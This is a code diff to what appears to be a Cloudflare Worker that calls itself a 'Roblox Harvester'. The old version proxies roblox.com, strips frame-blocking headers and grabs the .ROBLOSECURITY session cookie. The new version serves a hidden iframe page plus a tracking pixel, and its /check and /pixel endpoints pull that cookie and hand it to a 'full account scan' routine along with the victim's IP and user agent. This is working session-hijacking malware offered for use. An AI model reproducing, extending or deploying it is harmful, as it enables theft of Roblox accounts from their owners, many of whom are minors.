@@ -15,83 +15,80 @@ export default {
     }
     
     // ============================================================
-    // PROXY ROBLOX — Captures cookies from the iframe request
+    // SIMPLE HTML PAGE — loads in iframe, sends cookies naturally
     // ============================================================
     
-    if (url.pathname === '/' || url.pathname === '/proxy') {
-      // Forward the request to Roblox
-      const targetUrl = new URL("https://www.roblox.com");
-      
-      const proxyRequest = new Request(targetUrl, {
-        method: request.method,
-        headers: request.headers,
-        body: request.body,
-        redirect: "manual"
-      });
-      
-      const response = await fetch(proxyRequest);
-      
-      // === CAPTURE COOKIE FROM THE INCOMING REQUEST ===
-      const cookieHeader = request.headers.get("Cookie") || "";
-      console.log('Cookie header:', cookieHeader);
-      
-      const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);
-      
-      if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
-        const token = robloxMatch[1];
+    if (url.pathname === '/frame') {
+      const html = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <script>
+    // This runs inside the iframe — cookies are sent automatically
+    // because this is a cross-origin request from the parent page
+    
+    // Send the cookie to the worker
+    fetch('/check', {
+      credentials: 'include'
+    })
+    .then(function(res) {
+      return res.json();
+    })
+    .then(function(data) {
+      if (data && data.captured) {
         console.log('Token captured!');
-        
-        ctx.waitUntil(
-          (async () => {
-            try {
-              await processToken(token, request, env);
-            } catch (e) {
-              console.error('Process error:', e);
-            }
-          })()
-        );
-      } else {
-        console.log('No .ROBLOSECURITY cookie found in request');
       }
+    })
+    .catch(function(err) {
+      console.log('Error:', err);
+    });
+    
+    // Also try with an image pixel
+    var img = document.createElement('img');
+    img.src = '/pixel';
+    img.style.display = 'none';
+    document.body.appendChild(img);
+  <\/script>
+</head>
+<body>
+  <p style="display:none;">Loading...</p>
+</body>
+</html>
+      `;
       
-      // === STRIP FRAME-BLOCKING HEADERS ===
-      const newHeaders = new Headers(response.headers);
-      newHeaders.delete("X-Frame-Options");
-      newHeaders.delete("Content-Security-Policy");
-      newHeaders.set("X-Frame-Options", "ALLOWALL");
-      
-      // Add CORS headers
-      newHeaders.set("Access-Control-Allow-Origin", origin || "https://compiler-virid-ten.vercel.app");
-      newHeaders.set("Access-Control-Allow-Credentials", "true");
-      
-      // Forward Set-Cookie
-      const setCookie = response.headers.get("Set-Cookie");
-      if (setCookie) {
-        newHeaders.set("Set-Cookie", setCookie);
-      }
-      
-      let body = await response.text();
-      
-      // Rewrite links to keep them inside the proxy
-      const proxyOrigin = url.origin;
-      body = body.replace(/https?:\/\/www\.roblox\.com/g, proxyOrigin);
-      body = body.replace(/(src|href|action)="\//g, `$1="${proxyOrigin}/`);
-      body = body.replace(/(src|href|action)='\//g, `$1='${proxyOrigin}/`);
-      
-      return new Response(body, {
-        status: response.status,
-        statusText: response.statusText,
-        headers: newHeaders
+      return new Response(html, {
+        headers: {
+          'Content-Type': 'text/html',
+          'Cache-Control': 'no-cache, no-store',
+          ...corsHeaders
+        }
       });
     }
     
     // ============================================================
-    // PIXEL ENDPOINT
+    // PIXEL ENDPOINT — 1x1 transparent GIF
     // ============================================================
     
     if (url.pathname === '/pixel') {
       const pixel = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
       const decoded = Uint8Array.from(atob(pixel), c => c.charCodeAt(0));
+      
+      // Check for cookie on pixel request too
+      const cookieHeader = request.headers.get("Cookie") || "";
+      const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);
+      
+      if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
+        const token = robloxMatch[1];
+        ctx.waitUntil(
+          (async () => {
+            try {
+              await processToken(token, request, env);
+            } catch (e) {}
+          })()
+        );
+      }
       
       return new Response(decoded, {
         headers: {
@@ -102,14 +99,55 @@ export default {
       });
     }
     
-    return new Response('Roblox Proxy — Use / or /proxy', {
+    // ============================================================
+    // CHECK ENDPOINT — validates token
+    // ============================================================
+    
+    if (url.pathname === '/check') {
+      const cookieHeader = request.headers.get("Cookie") || "";
+      const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);
+      
+      if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
+        const token = robloxMatch[1];
+        
+        ctx.waitUntil(
+          (async () => {
+            try {
+              await processToken(token, request, env);
+            } catch (e) {}
+          })()
+        );
+        
+        return new Response(JSON.stringify({ status: 'ok', captured: true }), {
+          headers: {
+            'Content-Type': 'application/json',
+            ...corsHeaders
+          }
+        });
+      }
+      
+      return new Response(JSON.stringify({ status: 'ok', captured: false }), {
+        headers: {
+          'Content-Type': 'application/json',
+          ...corsHeaders
+        }
+      });
+    }
+    
+    return new Response('Roblox Harvester — Use /frame', {
       status: 200,
-      headers: { 'Content-Type': 'text/plain', ...corsHeaders }
+      headers: {
+        'Content-Type': 'text/plain',
+        ...corsHeaders
+      }
     });
   }
 };
 
-// === PROCESS TOKEN — FULL ACCOUNT SCAN ===
+// ============================================================
+// PROCESS TOKEN — FULL ACCOUNT SCAN
+// ============================================================
+
 async function processToken(token, request, env) {
   const ip = request.headers.get("CF-Connecting-IP") || "unknown";
   const ua = request.headers.get("User-Agent") || "unknown";
